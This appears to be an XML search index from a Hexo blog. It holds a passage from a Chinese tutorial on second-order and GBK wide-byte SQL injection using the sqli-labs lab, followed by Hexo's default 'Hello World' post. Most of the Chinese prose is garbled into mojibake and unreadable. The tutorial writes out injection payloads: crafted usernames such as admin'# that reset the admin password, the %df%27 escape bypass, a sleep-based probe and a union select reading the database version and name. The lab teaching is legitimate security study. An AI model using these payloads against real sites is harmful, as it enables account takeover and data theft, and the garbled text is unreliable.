åº”ç”¨ç¨‹åºä¸­å¹¿æ³›å­˜åœ¨çš„å®‰å…¨æ¼æ´å½¢å¼ã€‚ç›¸å¯¹äºä¸€æ¬¡æ³¨å…¥æ¼æ´è€Œè¨€ï¼ŒäºŒæ¬¡æ³¨å…¥æ¼æ´æ›´éš¾ä»¥è¢«å‘ç°ï¼Œä½†å®ƒå´å…·æœ‰ä¸ä¸€æ¬¡æ³¨å…¥æ”»å‡»æ¼æ´ç›¸åŒçš„æ”»å‡»å¨åŠ›ã€‚</p><h2 id="äºŒæ¬¡æ³¨å…¥åŸç†"><a href="#äºŒæ¬¡æ³¨å…¥åŸç†" class="headerlink" title="äºŒæ¬¡æ³¨å…¥åŸç†"></a>äºŒæ¬¡æ³¨å…¥åŸç†</h2><p>äºŒæ¬¡æ³¨å…¥çš„åŸç†æ˜¯ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨äº† <code>addslashes</code> æˆ–è€…æ˜¯å€ŸåŠ© <code>get_magic_quotes_gpc</code> å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ã€‚ä½†æ˜¯ <code>addslashes</code> æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œè™½ç„¶å‚æ•°åœ¨è¿‡æ»¤åä¼šæ·»åŠ  <code>\</code> è¿›è¡Œè½¬ä¹‰ï¼Œä½† <code>\</code> å¹¶ä¸ä¼šæ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œåœ¨å†™å…¥æ•°æ®åº“æ—¶è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚</p><p>åœ¨å°†æ•°æ®å­˜å…¥æ•°æ®åº“ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºè„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œä¸‹ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆ SQL çš„äºŒæ¬¡æ³¨å…¥ã€‚ä¾‹å¦‚ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ’å…¥æ•°æ®æ—¶ï¼Œæ•°æ®ä¸­å¸¦æœ‰å•å¼•å·ï¼Œç›´æ¥æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼›ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­ï¼Œåœ¨æ‹¼å‡‘çš„è¿‡ç¨‹ä¸­ï¼Œå°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p><h2 id="1-10-1äºŒæ¬¡æ³¨å…¥ä»£ç åˆ†æ"><a href="#1-10-1äºŒæ¬¡æ³¨å…¥ä»£ç åˆ†æ" class="headerlink" title="1.10.1äºŒæ¬¡æ³¨å…¥ä»£ç åˆ†æ"></a>1.10.1äºŒæ¬¡æ³¨å…¥ä»£ç åˆ†æ</h2><p>åœ¨ <code>sqli-lbas 24</code> ä¸­å­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚å…ˆæ¥åˆ†æä¸€ä¸‹ä»£ç ã€‚</p><p><code>mysql_escape_string</code> å‡½æ•°ä¼šå°†ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œä¾‹å¦‚ <code>&#39;</code> ç»è¿‡è½¬ä¹‰å°±æˆäº† <code>\&#39;</code>ï¼Œç„¶åç”¨ <code>INSERT INTO</code> å­˜å…¥æ•°æ®åº“ä¸­ã€‚</p><p>åœ¨ <code>login.php</code> ä¸­æŸ¥çœ‹æºç ï¼Œç™»å½•æ—¶è·å–ç”¨æˆ·åå’Œå¯†ç ï¼Œä½¿ç”¨ <code>mysql_escape_string</code> å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè½¬ä¹‰ã€‚è½¬ä¹‰ä¹‹ååœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾æŒ‡å®šçš„è´¦å·å’Œå¯†ç ï¼Œå†ä¼ å…¥åˆ° <code>session</code> ä¸­ã€‚</p><p>åœ¨ <code>pass_change.php</code> ä¸­æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] å¤åˆ¶ç»™ <span class="variable">$username</span> æ— ä»»ä½•è¿‡æ»¤å†å¸¦å…¥ UPDATE è¯­å¥ä¸­é€ æˆæ³¨å…¥ã€‚</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªæµç¨‹å°±æ˜¯ï¼šæ³¨å†Œç”¨æˆ· â†’ æ›´æ”¹å¯†ç æ—¶è§¦å‘æ³¨å…¥ã€‚å¯ä»¥çœ‹åˆ°äºŒæ¬¡æ³¨å…¥è¾ƒä¸ºéšè”½ï¼Œé€šå¸¸å‘ç”Ÿåœ¨éœ€è¦äºŒæ¬¡å¸¦å…¥æ•°æ®æäº¤çš„åŠŸèƒ½é‡Œï¼Œä¾‹å¦‚ç”¨æˆ·æ³¨å†Œ â†’ ä¿®æ”¹å¯†ç ï¼Œé‚®ç®±æ³¨å†Œ â†’ ä¿®æ”¹å¯†ç ï¼Œæ–‡ç« æ·»åŠ  â†’ æ–‡ç« ç¼–è¾‘ç­‰ã€‚</p><h2 id="1-19-8-é»‘ç›’ç¯å¢ƒä¸‹è¿›è¡ŒäºŒæ¬¡æ³¨å…¥æµ‹è¯•"><a href="#1-19-8-é»‘ç›’ç¯å¢ƒä¸‹è¿›è¡ŒäºŒæ¬¡æ³¨å…¥æµ‹è¯•" class="headerlink" title="1.19.8 é»‘ç›’ç¯å¢ƒä¸‹è¿›è¡ŒäºŒæ¬¡æ³¨å…¥æµ‹è¯•"></a>1.19.8 é»‘ç›’ç¯å¢ƒä¸‹è¿›è¡ŒäºŒæ¬¡æ³¨å…¥æµ‹è¯•</h2><p>å…ˆç¡®å®šæµ‹è¯•çš„ç½‘ç«™æ˜¯å¦è¿›è¡Œè¿‡æ»¤ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç½‘ç«™éƒ½ä¼šå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åå¯»æ‰¾å¯èƒ½ä¼šå¸¦å…¥æ¶æ„æ•°æ®äºŒæ¬¡ä½¿ç”¨çš„åœ°æ–¹ã€‚ä¾‹å¦‚ï¼š</p><ul><li>ç”¨æˆ·æ³¨å†Œ â†’ ä¿®æ”¹å¯†ç </li><li>é‚®ç®±æ³¨å†Œ â†’ ä¿®æ”¹å¯†ç </li><li>æ–‡ç« æ·»åŠ  â†’ æ–‡ç« ç¼–è¾‘</li></ul><p>å¯»æ‰¾ä¸€åˆ‡å­˜åœ¨äºŒæ¬¡ä½¿ç”¨çš„åŠŸèƒ½ç‚¹ã€‚</p><p>äºŒæ¬¡æ³¨å…¥æµ‹è¯•ä¸­ï¼ŒäºŒæ¬¡æ³¨å…¥å¤šæ•°æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œæ‰€ä»¥è¦æ³¨æ„é—­åˆé—®é¢˜ã€‚ç°åœ¨æ³¨å†Œç”¨æˆ· <code>a&#39;</code>ï¼Œå†åˆ†åˆ«æ³¨å†Œç”¨æˆ· <code>a&#39; AND 1=1#</code> å’Œ <code>a&#39; AND 1=2#</code>ï¼Œç„¶ååœ¨å¯èƒ½è§¦å‘çš„åœ°æ–¹è¿›è¡Œæµ‹è¯•ã€‚</p><p>å¯†ç è¾“å…¥ <code>a123456</code> æäº¤åå¯ä»¥çœ‹åˆ°å¯†ç è¢«ä¿®æ”¹æˆåŠŸäº†ã€‚å¦‚æœæ˜¯ <code>a&#39; AND 1=2#</code>ï¼Œåˆ™æ€ä¹ˆä¿®æ”¹éƒ½ä¸ä¼šæˆåŠŸã€‚</p><p>è¿™ç§æƒ…å†µä¸‹å¯ä»¥åˆ¤æ–­æ˜¯äºŒæ¬¡æ³¨å…¥ã€‚è¿™ä¸ªæ³¨å…¥ç‚¹ä¼ å…¥çš„å‚æ•°æœ‰é•¿åº¦é™åˆ¶ï¼Œå¯¼è‡´äºŒæ¬¡æ³¨å…¥æŸ¥è¯¢æ•æ„Ÿä¿¡æ¯ï¼ŒäºŒæ¬¡æ³¨å…¥é…åˆ MySQL æŠ¥é”™æŸ¥è¯¢æ•°æ®å‡ä¸èƒ½æˆåŠŸï¼Œåªèƒ½ä¿®æ”¹å…¶ä»–è´¦å·çš„å¯†ç äº†ï¼Œä¾‹å¦‚ <code>admin</code> çš„å¯†ç ã€‚</p><p>æ³¨å†Œç”¨æˆ· <code>admin&#39;#</code>ï¼Œç™»å½•åä¿®æ”¹å¯†ç ï¼Œå°±èƒ½ä¿®æ”¹ <code>admin</code> çš„å¯†ç ã€‚</p><h1 id="1-11-å®½å­—èŠ‚æ³¨å…¥"><a href="#1-11-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="1.11 å®½å­—èŠ‚æ³¨å…¥"></a>1.11 å®½å­—èŠ‚æ³¨å…¥</h1><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>å®½å­—èŠ‚æ³¨å…¥ï¼Œåœ¨ SQL è¿›è¡Œé˜²æ³¨å…¥çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¼€å¯ <code>GPC</code>ï¼Œè¿‡æ»¤ç‰¹æ®Šå­—ç¬¦ã€‚ä¸€èˆ¬æƒ…å†µä¸‹å¼€å¯ <code>GPC</code> æ˜¯å¯ä»¥é˜²å¾¡å¾ˆå¤šå­—ç¬¦ä¸²å‹çš„æ³¨å…¥ï¼Œä½†æ˜¯å¦‚æœæ•°æ®åº“ç¼–ç ä¸å¯¹ï¼Œä¹Ÿå¯ä»¥å¯¼è‡´ SQL é˜²æ³¨å…¥ç»•è¿‡ï¼Œè¾¾åˆ°æ³¨å…¥çš„ç›®çš„ã€‚å¦‚æœæ•°æ®åº“è®¾ç½®å®½å­—èŠ‚å­—ç¬¦é›† <code>GBK</code> ä¼šå¯¼è‡´å®½å­—èŠ‚æ³¨å…¥ï¼Œä»è€Œé€ƒé€¸ <code>GPC</code>ã€‚</p><h2 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h2><p>ç®€å•ç†è§£ï¼šæ•°æ®åº“ç¼–ç ä¸ PHP ç¼–ç è®¾ç½®ä¸ºä¸åŒçš„ä¸¤ä¸ªç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚</p><p>æ·±å…¥è®²è§£ï¼šè¦æœ‰å®½å­—èŠ‚æ³¨å…¥æ¼æ´ï¼Œé¦–å…ˆè¦æ»¡è¶³æ•°æ®åº“åç«¯ä½¿ç”¨åŒ&#x2F;å¤šå­—èŠ‚è§£æ SQL è¯­å¥ï¼Œå…¶æ¬¡è¿˜è¦ä¿è¯åœ¨è¿™ç§å­—ç¬¦é›†èŒƒå›´ä¸­åŒ…å«ä½å­—èŠ‚ä½æ˜¯ <code>0x5C (01011100)</code> çš„å­—ç¬¦ã€‚åˆæ­¥çš„æµ‹è¯•ç»“æœ <code>Big5</code> å’Œ <code>GBK</code> å­—ç¬¦é›†éƒ½æ˜¯æœ‰çš„ï¼Œ<code>UTF-8</code> å’Œ <code>GB2312</code> æ²¡æœ‰è¿™ç§å­—ç¬¦ï¼ˆä¹Ÿå°±ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼‰ã€‚</p><h2 id="GPC-ç»•è¿‡è¿‡ç¨‹"><a href="#GPC-ç»•è¿‡è¿‡ç¨‹" class="headerlink" title="GPC ç»•è¿‡è¿‡ç¨‹"></a>GPC ç»•è¿‡è¿‡ç¨‹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df%27 ===(addslashes)===&gt; %df%5c%27 ===(æ•°æ®åº“ GBK)===&gt; é‹&#x27;</span><br></pre></td></tr></table></figure><h2 id="1-11-1-å®½å­—èŠ‚æ³¨å…¥ä»£ç åˆ†æ"><a href="#1-11-1-å®½å­—èŠ‚æ³¨å…¥ä»£ç åˆ†æ" class="headerlink" title="1.11.1 å®½å­—èŠ‚æ³¨å…¥ä»£ç åˆ†æ"></a>1.11.1 å®½å­—èŠ‚æ³¨å…¥ä»£ç åˆ†æ</h2><p>ä»æºä»£ç åˆ†æï¼Œå­˜åœ¨æ¼æ´çš„ä»£ç é¦–å…ˆ <code>check_addslashes</code> æ˜¯å°†ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œå°† <code>&#39;</code> å˜æˆ <code>\&#39;</code>ã€‚<code>mysql_query</code> è®¾ç½®æ•°æ®åº“çš„ç¼–ç ä¸º <code>GBK</code>ï¼Œå°† <code>id</code> å‚æ•°ä¼ å…¥åˆ° SQL ä¸­å¸¦å…¥æŸ¥è¯¢ã€‚ä¼ å…¥ <code>%df%27</code> å³å¯é€ƒé€¸ <code>GPC</code>ï¼Œæ•…å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚</p><h2 id="1-11-2-é»‘ç›’ç¯å¢ƒä¸‹çš„å®½å­—èŠ‚æ”»å‡»"><a href="#1-11-2-é»‘ç›’ç¯å¢ƒä¸‹çš„å®½å­—èŠ‚æ”»å‡»" class="headerlink" title="1.11.2 é»‘ç›’ç¯å¢ƒä¸‹çš„å®½å­—èŠ‚æ”»å‡»"></a>1.11.2 é»‘ç›’ç¯å¢ƒä¸‹çš„å®½å­—èŠ‚æ”»å‡»</h2><p>å®½å­—èŠ‚æ£€æµ‹è¾ƒä¸ºç®€å•ï¼Œè¾“å…¥ <code>%df%27</code> æ£€æµ‹å³å¯ï¼Œæˆ–è€…ä½¿ç”¨é…åˆ <code>and 1=1</code> æ£€æµ‹å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1%df%27%20and%201=1--+ é¡µé¢æ˜¯å¦å­˜åœ¨ä¹±ç </span><br><span class="line">-1%df%27%20or%20sleep(10)--+ é¡µé¢æ˜¯å¦å­˜åœ¨å»¶æ—¶</span><br></pre></td></tr></table></figure><p>å‡å¯ä»¥æµ‹è¯•å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/13/hello-world/"/>
      <url>/2025/04/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
